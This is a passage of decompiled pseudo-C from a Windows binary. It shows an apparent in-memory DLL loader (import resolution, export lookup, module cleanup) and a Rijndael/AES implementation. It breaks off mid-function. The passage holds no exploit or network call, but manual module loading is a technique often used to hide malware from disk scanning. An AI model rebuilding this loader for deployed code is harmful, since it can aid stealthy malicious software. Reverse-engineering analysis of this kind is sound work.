  local_c = 1;
  if (*(int *)(*param_1 + 0x84) != 0) {
    lp = (int *)(*(int *)(*param_1 + 0x80) + iVar1);
    iVar5 = IsBadReadPtr(lp,0x14);
    while( true ) {
      if (iVar5 != 0) {
        return local_c;
      }
      if (lp[3] == 0) {
        return local_c;
      }
      iVar5 = (*(code *)piVar2[9])(lp[3] + iVar1,piVar2[0xc]);
      if (iVar5 == 0) break;
      pvVar3 = realloc((void *)piVar2[2],piVar2[3] * 4 + 4);
      if (pvVar3 == (void *)0x0) {
        (*(code *)piVar2[0xb])(iVar5,piVar2[0xc]);
        dwErrCode = 0xe;
        goto LAB_004028fd;
      }
      piVar2[2] = (int)pvVar3;
      *(int *)((int)pvVar3 + piVar2[3] * 4) = iVar5;
      piVar2[3] = piVar2[3] + 1;
      if (*lp == 0) {
        puVar6 = (uint *)(iVar1 + lp[4]);
        param_1 = puVar6;
      }
      else {
        puVar6 = (uint *)(lp[4] + iVar1);
        param_1 = (uint *)(*lp + iVar1);
      }
      for (; uVar4 = *param_1, uVar4 != 0; param_1 = param_1 + 1) {
        if ((uVar4 & 0x80000000) == 0) {
          iVar7 = piVar2[0xc];
          uVar4 = uVar4 + iVar1 + 2;
        }
        else {
          iVar7 = piVar2[0xc];
          uVar4 = uVar4 & 0xffff;
        }
        uVar4 = (*(code *)piVar2[10])(iVar5,uVar4,iVar7);
        *puVar6 = uVar4;
        if (uVar4 == 0) {
          local_c = 0;
          break;
        }
        puVar6 = puVar6 + 1;
      }
      if (local_c == 0) {
        (*(code *)piVar2[0xb])(iVar5,piVar2[0xc]);
        SetLastError(0x7f);
        return 0;
      }
      lp = lp + 5;
      iVar5 = IsBadReadPtr(lp,0x14);
    }
    dwErrCode = 0x7e;
LAB_004028fd:
    SetLastError(dwErrCode);
    local_c = 0;
    iVar5 = local_c;
  }
  return iVar5;
}



int FUN_00402924(int *param_1,char *param_2)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  ushort *puVar4;
  int iVar5;
  int *piVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0x7c) != 0) {
    iVar5 = *(int *)(*param_1 + 0x78);
    iVar3 = *(int *)(iVar5 + 0x18 + iVar1);
    iVar5 = iVar5 + iVar1;
    if ((iVar3 != 0) && (*(int *)(iVar5 + 0x14) != 0)) {
      if ((short)((uint)param_2 >> 0x10) == 0) {
        if (*(uint *)(iVar5 + 0x10) <= ((uint)param_2 & 0xffff)) {
          uVar2 = ((uint)param_2 & 0xffff) - *(uint *)(iVar5 + 0x10);
LAB_004029ba:
          if (uVar2 < *(uint *)(iVar5 + 0x14) || uVar2 == *(uint *)(iVar5 + 0x14)) {
            return *(int *)(*(int *)(iVar5 + 0x1c) + uVar2 * 4 + iVar1) + iVar1;
          }
        }
      }
      else {
        piVar6 = (int *)(*(int *)(iVar5 + 0x20) + iVar1);
        puVar4 = (ushort *)(*(int *)(iVar5 + 0x24) + iVar1);
        param_1 = (int *)0x0;
        if (iVar3 != 0) {
          do {
            iVar3 = _stricmp(param_2,(char *)(*piVar6 + iVar1));
            if (iVar3 == 0) {
              uVar2 = (uint)*puVar4;
              goto LAB_004029ba;
            }
            param_1 = (int *)((int)param_1 + 1);
            piVar6 = piVar6 + 1;
            puVar4 = puVar4 + 1;
          } while (param_1 < *(uint *)(iVar5 + 0x18));
        }
      }
    }
  }
  SetLastError(0x7f);
  return 0;
}



void FUN_004029cc(int *param_1)

{
  int iVar1;
  HANDLE hHeap;
  int iVar2;
  DWORD dwFlags;
  
  if (param_1 != (int *)0x0) {
    if (param_1[4] != 0) {
      (*(code *)(*(int *)(*param_1 + 0x28) + param_1[1]))(param_1[1],0,0);
    }
    if (param_1[2] != 0) {
      iVar2 = 0;
      if (0 < param_1[3]) {
        do {
          iVar1 = *(int *)(param_1[2] + iVar2 * 4);
          if (iVar1 != 0) {
            (*(code *)param_1[0xb])(iVar1,param_1[0xc]);
          }
          iVar2 = iVar2 + 1;
        } while (iVar2 < param_1[3]);
      }
      free((void *)param_1[2]);
    }
    if (param_1[1] != 0) {
      (*(code *)param_1[8])(param_1[1],0,0x8000,param_1[0xc]);
    }
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,param_1);
  }
  return;
}



void __fastcall FUN_00402a46(undefined4 *param_1)

{
  *(undefined *)(param_1 + 1) = 0;
  *param_1 = &PTR_FUN_0040bc7c;
  return;
}



void * __thiscall FUN_00402a53(void *param_1_00,byte param_1)

{
  FUN_00402a6f();
  if ((param_1 & 1) != 0) {
    operator_delete(param_1_00);
  }
  return param_1_00;
}



void __fastcall FUN_00402a6f(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0040bc7c;
  return;
}



void __thiscall FUN_00402a76(int param_1_00,byte *param_1,uint *param_2,int param_3,byte *param_4)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  uint *puVar6;
  char *pcVar7;
  undefined4 *puVar8;
  int iVar9;
  int iVar10;
  undefined4 *puVar11;
  exception local_18 [20];
  
  if (param_1 == (byte *)0x0) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&DAT_0040d570);
  }
  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&DAT_0040d570);
  }
  if (((param_4 != (byte *)0x10) && (param_4 != (byte *)0x18)) && (param_4 != (byte *)0x20)) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&DAT_0040d570);
  }
  *(byte **)(param_1_00 + 0x3cc) = param_4;
  *(int *)(param_1_00 + 0x3c8) = param_3;
  memcpy((void *)(param_1_00 + 0x3d0),param_2,(size_t)param_4);
  memcpy((void *)(param_1_00 + 0x3f0),param_2,*(size_t *)(param_1_00 + 0x3cc));
  if (*(int *)(param_1_00 + 0x3c8) == 0x10) {
    if (*(int *)(param_1_00 + 0x3cc) == 0x10) {
      iVar3 = 10;
    }
    else {
      iVar3 = ((*(int *)(param_1_00 + 0x3cc) != 0x18) - 1 & 0xfffffffe) + 0xe;
    }
  }
  else {
    if (*(int *)(param_1_00 + 0x3c8) != 0x18) {
      *(undefined4 *)(param_1_00 + 0x410) = 0xe;
      goto LAB_00402b9a;
    }
    iVar3 = ((*(int *)(param_1_00 + 0x3cc) == 0x20) - 1 & 0xfffffffe) + 0xe;
  }
  *(int *)(param_1_00 + 0x410) = iVar3;
LAB_00402b9a:
  iVar3 = *(int *)(param_1_00 + 0x3cc) / 4;
  iVar9 = 0;
  if (-1 < *(int *)(param_1_00 + 0x410)) {
    puVar8 = (undefined4 *)(param_1_00 + 8);
    do {
      iVar5 = iVar3;
      puVar11 = puVar8;
      if (0 < iVar3) {
        for (; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar11 = 0;
          puVar11 = puVar11 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar8 = puVar8 + 8;
    } while (iVar9 <= *(int *)(param_1_00 + 0x410));
  }
  iVar9 = 0;
  if (-1 < *(int *)(param_1_00 + 0x410)) {
    puVar8 = (undefined4 *)(param_1_00 + 0x1e8);
    do {
      iVar5 = iVar3;
      puVar11 = puVar8;
      if (0 < iVar3) {
        for (; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar11 = 0;
          puVar11 = puVar11 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar8 = puVar8 + 8;
    } while (iVar9 <= *(int *)(param_1_00 + 0x410));
  }
  pcVar4 = (char *)(*(int *)(param_1_00 + 0x3c8) / 4);
  iVar9 = (*(int *)(param_1_00 + 0x410) + 1) * iVar3;
  puVar6 = (uint *)(param_1_00 + 0x414);
  param_2 = (uint *)pcVar4;
  if (0 < (int)pcVar4) {
    do {
      *puVar6 = (uint)*param_1 << 0x18;
      *puVar6 = *puVar6 | (uint)param_1[1] << 0x10;
      *puVar6 = *puVar6 | (uint)param_1[2] << 8;
      *puVar6 = *puVar6 | (uint)param_1[3];
      param_1 = param_1 + 4;
      puVar6 = puVar6 + 1;
      param_2 = (uint *)((int)param_2 + -1);
    } while (param_2 != (uint *)0x0);
  }
  param_2 = (uint *)0x0;
  if (0 < (int)pcVar4) {
    puVar8 = (undefined4 *)(param_1_00 + 0x414);
    do {
      if (iVar9 <= (int)param_2) goto LAB_00402e04;
      iVar5 = (int)param_2 / iVar3;
      iVar10 = (int)param_2 % iVar3;
      *(undefined4 *)(param_1_00 + 8 + (iVar10 + iVar5 * 8) * 4) = *puVar8;
      param_2 = (uint *)((int)param_2 + 1);
      uVar1 = *puVar8;
      puVar8 = puVar8 + 1;
      *(undefined4 *)
       (param_1_00 + 0x1e8 + (iVar10 + (*(int *)(param_1_00 + 0x410) - iVar5) * 8) * 4) = uVar1;
    } while ((int)param_2 < (int)pcVar4);
  }
  if ((int)param_2 < iVar9) {
    param_4 = &DAT_0040bbfc;
    do {
      uVar2 = *(uint *)(param_1_00 + 0x410 + (int)pcVar4 * 4);
      *(uint *)(param_1_00 + 0x414) =
           *(uint *)(param_1_00 + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x10 & 0xff] ^ *param_4,
                                      (&DAT_004089fc)[uVar2 >> 8 & 0xff]),
                             (&DAT_004089fc)[uVar2 & 0xff]),(&DAT_004089fc)[uVar2 >> 0x18]);
      param_4 = param_4 + 1;
      if (pcVar4 == (char *)0x8) {
        puVar6 = (uint *)(param_1_00 + 0x418);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
        uVar2 = *(uint *)(param_1_00 + 0x420);
        puVar6 = (uint *)(param_1_00 + 0x428);
        *(uint *)(param_1_00 + 0x424) =
             *(uint *)(param_1_00 + 0x424) ^
             CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x18],
                                        (&DAT_004089fc)[uVar2 >> 0x10 & 0xff]),
                               (&DAT_004089fc)[uVar2 >> 8 & 0xff]),(&DAT_004089fc)[uVar2 & 0xff]);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
      else if (1 < (int)pcVar4) {
        puVar6 = (uint *)(param_1_00 + 0x418);
        pcVar7 = pcVar4 + -1;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          pcVar7 = pcVar7 + -1;
        } while (pcVar7 != (char *)0x0);
      }
      param_1 = (byte *)0x0;
      if (0 < (int)pcVar4) {
        puVar8 = (undefined4 *)(param_1_00 + 0x414);
        do {
          if (iVar9 <= (int)param_2) goto LAB_00402e04;
          iVar5 = (int)param_2 / iVar3;
          iVar10 = (int)param_2 % iVar3;
          *(undefined4 *)(param_1_00 + 8 + (iVar10 + iVar5 * 8) * 4) = *puVar8;
          param_1 = (byte *)((int)param_1 + 1);
          uVar1 = *puVar8;
          puVar8 = puVar8 + 1;
          param_2 = (uint *)((int)param_2 + 1);
          *(undefined4 *)
           (param_1_00 + 0x1e8 + (iVar10 + (*(int *)(param_1_00 + 0x410) - iVar5) * 8) * 4) = uVar1;
        } while ((int)param_1 < (int)pcVar4);
      }
    } while ((int)param_2 < iVar9);
  }
LAB_00402e04:
  param_4 = (byte *)0x1;
  if (1 < *(int *)(param_1_00 + 0x410)) {
    param_2 = (uint *)(param_1_00 + 0x208);
    do {
      iVar9 = iVar3;
      puVar6 = param_2;
      if (0 < iVar3) {
        do {
          uVar2 = *puVar6;
          *puVar6 = *(uint *)(&DAT_0040abfc + (uVar2 >> 0x18) * 4) ^
                    *(uint *)(&DAT_0040affc + (uVar2 >> 0x10 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b3fc + (uVar2 >> 8 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b7fc + (uVar2 & 0xff) * 4);
          iVar9 = iVar9 + -1;
          puVar6 = puVar6 + 1;
        } while (iVar9 != 0);
      }
      param_4 = (byte *)((int)param_4 + 1);
      param_2 = param_2 + 8;
    } while ((int)param_4 < *(int *)(param_1_00 + 0x410));
  }
  *(undefined *)(param_1_00 + 4) = 1;
  return;
}



// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_00402e7e(int param_1_00,uint *param_1,byte *param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  exception local_2c [12];
  int local_20;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)(param_1_00 + 4) != '\0') {
    local_14 = ((uint)*(byte *)param_1 << 0x18 | (uint)*(byte *)((int)param_1 + 1) << 0x10 |
                (uint)*(byte *)((int)param_1 + 2) << 8 | (uint)*(byte *)((int)param_1 + 3)) ^
               *(uint *)(param_1_00 + 8);
    local_10 = ((uint)*(byte *)((int)param_1 + 4) << 0x18 |
                (uint)*(byte *)((int)param_1 + 5) << 0x10 | (uint)*(byte *)((int)param_1 + 6) << 8 |
               (uint)*(byte *)((int)param_1 + 7)) ^ *(uint *)(param_1_00 + 0xc);
    uVar4 = ((uint)*(byte *)((int)param_1 + 8) << 0x18 | (uint)*(byte *)((int)param_1 + 9) << 0x10 |
             (uint)*(byte *)((int)param_1 + 10) << 8 | (uint)*(byte *)((int)param_1 + 0xb)) ^
            *(uint *)(param_1_00 + 0x10);
    iVar1 = *(int *)(param_1_00 + 0x410);
    local_c = ((uint)CONCAT11(*(byte *)((int)param_1 + 0xe),*(byte *)((int)param_1 + 0xf)) |
              (uint)*(byte *)((int)param_1 + 0xc) << 0x18 |
              (uint)*(byte *)((int)param_1 + 0xd) << 0x10) ^ *(uint *)(param_1_00 + 0x14);
    if (1 < iVar1) {
      local_8 = iVar1 + -1;
      param_1 = (uint *)(param_1_00 + 0x30);
      local_18 = uVar4;
      do {
        uVar5 = *(uint *)(&DAT_004093fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_18 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_004097fc + (local_14 & 0xff) * 4) ^ param_1[-1];
        uVar4 = *(uint *)(&DAT_00408ffc + (local_c >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_18 >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_10 & 0xff) * 4) ^ *param_1;
        uVar3 = *(uint *)(&DAT_00408bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_18 & 0xff) * 4) ^ param_1[1];
        local_14 = *(uint *)(&DAT_004093fc + (local_18 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408bfc + (local_14 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004097fc + (local_c & 0xff) * 4) ^ param_1[-2];
        local_8 = local_8 + -1;
        param_1 = param_1 + 8;
        local_18 = uVar4;
        local_10 = uVar5;
        local_c = uVar3;
      } while (local_8 != 0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 8 + param_1_00);
    param_1_00 = iVar1 * 0x20 + 8 + param_1_00;
    *param_2 = (&DAT_004089fc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_004089fc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[2] = (&DAT_004089fc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[3] = (&DAT_004089fc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 4);
    param_2[4] = (&DAT_004089fc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_004089fc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[6] = (&DAT_004089fc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[7] = (&DAT_004089fc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 8);
    param_2[8] = (&DAT_004089fc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_004089fc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[10] = (&DAT_004089fc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xb] = (&DAT_004089fc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 0xc);
    param_2[0xc] = (&DAT_004089fc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_004089fc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_004089fc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_004089fc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = param_1_00;
  exception::exception(local_2c,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_2c,(ThrowInfo *)&DAT_0040d570);
}



// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_004031bc(int param_1_00,byte *param_1,byte *param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  exception local_30 [16];
  int local_20;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)(param_1_00 + 4) != '\0') {
    uVar4 = ((uint)*param_1 << 0x18 | (uint)param_1[1] << 0x10 | (uint)param_1[2] << 8 |
            (uint)param_1[3]) ^ *(uint *)(param_1_00 + 0x1e8);
    local_14 = ((uint)param_1[4] << 0x18 | (uint)param_1[5] << 0x10 | (uint)param_1[6] << 8 |
               (uint)param_1[7]) ^ *(uint *)(param_1_00 + 0x1ec);
    local_10 = ((uint)param_1[8] << 0x18 | (uint)param_1[9] << 0x10 | (uint)param_1[10] << 8 |
               (uint)param_1[0xb]) ^ *(uint *)(param_1_00 + 0x1f0);
    iVar1 = *(int *)(param_1_00 + 0x410);
    local_c = ((uint)CONCAT11(param_1[0xe],param_1[0xf]) |
              (uint)param_1[0xc] << 0x18 | (uint)param_1[0xd] << 0x10) ^ *(uint *)(param_1_00 + 500)
    ;
    if (1 < iVar1) {
      puVar5 = (uint *)(param_1_00 + 0x210);
      local_8 = iVar1 + -1;
      do {
        uVar7 = *(uint *)(&DAT_0040a3fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (local_14 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (uVar4 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_10 & 0xff) * 4) ^ puVar5[-1];
        uVar3 = *(uint *)(&DAT_00409bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (uVar4 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_c & 0xff) * 4) ^ *puVar5;
        uVar6 = *(uint *)(&DAT_00409bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (uVar4 & 0xff) * 4) ^ puVar5[1];
        uVar4 = *(uint *)(&DAT_00409ffc + (local_c >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (uVar4 >> 0x18) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_14 & 0xff) * 4) ^ puVar5[-2];
        puVar5 = puVar5 + 8;
        local_8 = local_8 + -1;
        local_14 = uVar7;
        local_10 = uVar3;
        local_c = uVar6;
      } while (local_8 != 0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 0x1e8 + param_1_00);
    param_1_00 = iVar1 * 0x20 + 0x1e8 + param_1_00;
    *param_2 = (&DAT_00408afc)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_00408afc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[2] = (&DAT_00408afc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[3] = (&DAT_00408afc)[local_14 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 4);
    param_2[4] = (&DAT_00408afc)[local_14 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_00408afc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[6] = (&DAT_00408afc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[7] = (&DAT_00408afc)[local_10 & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 8);
    param_2[8] = (&DAT_00408afc)[local_10 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_00408afc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[10] = (&DAT_00408afc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xb] = (&DAT_00408afc)[local_c & 0xff] ^ (byte)local_8;
    uVar2 = *(undefined4 *)(param_1_00 + 0xc);
    param_2[0xc] = (&DAT_00408afc)[local_c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_00408afc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_00408afc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    local_8._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_00408afc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = param_1_00;
  exception::exception(local_30,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_30,(ThrowInfo *)&DAT_0040d570);
}



void __thiscall FUN_0040350f(int param_1_00,byte *param_1,byte *param_2)

{
  undefined4 uVar1;
  uint *puVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)(param_1_00 + 4) == '\0') {
    exception::exception(local_38,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&DAT_0040d570);
  }
  if (*(int *)(param_1_00 + 0x3cc) == 0x10) {
    FUN_00402e7e(param_1,param_2);
  }
  else {
    iVar3 = *(int *)(param_1_00 + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (iVar3 != 6) + 1) * 0x20;
    local_1c = *(int *)(&DAT_0040bc24 + iVar4);
    local_18 = *(int *)(&DAT_0040bc2c + iVar4);
    local_20 = *(int *)(&DAT_0040bc34 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)(param_1_00 + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)(param_1_00 + 8);
      do {
        *puVar5 = (uint)*param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)param_1[1] << 0x10;
        *puVar5 = *puVar5 | (uint)param_1[2] << 8;
        *puVar5 = *puVar5 | (uint)param_1[3];
        puVar2 = local_8 + 1;
        param_1 = param_1 + 4;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar2;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)(param_1_00 + 0x410)) {
      local_c = (uint *)(param_1_00 + 0x28);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - local_1c;
          param_1 = (byte *)local_1c;
          local_28 = local_20 - local_1c;
          puVar5 = (uint *)(param_1_00 + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)(param_1_00 + 0x455 + ((local_24 + (int)param_1) % iVar3) * 4)
            ;
            puVar2 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_004093fc + local_2c * 4) ^
                      *(uint *)(&DAT_004097fc +
                               (*(uint *)(param_1_00 + 0x454 +
                                         ((local_28 + (int)param_1) % iVar3) * 4) & 0xff) * 4) ^
                      *(uint *)(&DAT_00408ffc +
                               (uint)*(byte *)(param_1_00 + 0x456 + ((int)param_1 % iVar3) * 4) * 4)
                      ^ *(uint *)(&DAT_00408bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = (byte *)((int)param_1 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar2;
          } while (local_14 != 0);
        }
        memcpy((void *)(param_1_00 + 0x454),(void *)(param_1_00 + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)(param_1_00 + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      local_1c = local_1c - local_18;
      local_20 = local_20 - local_18;
      pbVar6 = param_2;
      param_2 = (byte *)(param_1_00 + 0x454);
      do {
        uVar1 = *(undefined4 *)
                 (param_1_00 + 8 + ((int)local_8 + *(int *)(param_1_00 + 0x410) * 8) * 4);
        *pbVar6 = (&DAT_004089fc)[*(byte *)((int)param_2 + 3)] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar6[1] = (&DAT_004089fc)
                    [*(byte *)(param_1_00 + 0x456 + ((local_1c + local_18) % iVar3) * 4)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar6[2] = (&DAT_004089fc)[*(byte *)(param_1_00 + 0x455 + (local_18 % iVar3) * 4)] ^
                    (byte)((uint)uVar1 >> 8);
        param_1._0_1_ = (byte)uVar1;
        pbVar6[3] = (&DAT_004089fc)
                    [*(uint *)(param_1_00 + 0x454 + ((local_20 + local_18) % iVar3) * 4) & 0xff] ^
                    (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        local_18 = local_18 + 1;
        param_2 = (byte *)((int)param_2 + 4);
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}



void __thiscall FUN_00403797(int param_1_00,byte *param_1,byte *param_2)

{
  undefined4 uVar1;
  uint *puVar2;
  int iVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  exception local_38 [12];
  uint local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint *local_c;
  uint *local_8;
  
  if (*(char *)(param_1_00 + 4) == '\0') {
    exception::exception(local_38,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_38,(ThrowInfo *)&DAT_0040d570);
  }
  if (*(int *)(param_1_00 + 0x3cc) == 0x10) {
    FUN_004031bc(param_1,param_2);
  }
  else {
    iVar3 = *(int *)(param_1_00 + 0x3cc) / 4;
    iVar4 = (-(uint)(iVar3 != 4) & (iVar3 != 6) + 1) * 0x20;
    local_1c = *(int *)(&DAT_0040bc28 + iVar4);
    local_18 = *(int *)(&DAT_0040bc30 + iVar4);
    local_20 = *(int *)(&DAT_0040bc38 + iVar4);
    if (0 < iVar3) {
      puVar5 = (uint *)(param_1_00 + 0x454);
      local_10 = iVar3;
      local_8 = (uint *)(param_1_00 + 0x1e8);
      do {
        *puVar5 = (uint)*param_1 << 0x18;
        *puVar5 = *puVar5 | (uint)param_1[1] << 0x10;
        *puVar5 = *puVar5 | (uint)param_1[2] << 8;
        *puVar5 = *puVar5 | (uint)param_1[3];
        puVar2 = local_8 + 1;
        param_1 = param_1 + 4;
        *puVar5 = *puVar5 ^ *local_8;
        local_10 = local_10 + -1;
        puVar5 = puVar5 + 1;
        local_8 = puVar2;
      } while (local_10 != 0);
    }
    local_10 = 1;
    if (1 < *(int *)(param_1_00 + 0x410)) {
      local_c = (uint *)(param_1_00 + 0x208);
      do {
        if (0 < iVar3) {
          local_8 = local_c;
          local_24 = local_18 - local_1c;
          param_1 = (byte *)local_1c;
          local_28 = local_20 - local_1c;
